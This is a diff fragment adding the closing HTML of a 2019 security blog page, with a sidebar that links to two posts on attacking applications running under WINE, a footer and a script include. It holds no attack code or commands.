+          <a href="/posts/attacking-wine-part-ii/">Attacking applications running under WINE (Part II)</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/posts/attacking-wine-part-i/">Attacking applications running under WINE (Part I)</a>
+        </li>
+	    
+    </ul>
+</div>
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-navy bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://schlafwandler.github.io" >
+    &copy; 2019 Pointers to the void
+  </a>
+    <div>
+
+
+
+
+
+
+
+
+
+
+</div>
+  </div>
+</footer>
+
+    
+
+  <script src="/dist/js/app.3fc0f988d21662902933.js"></script>
+
+
+  </body>
+</html>
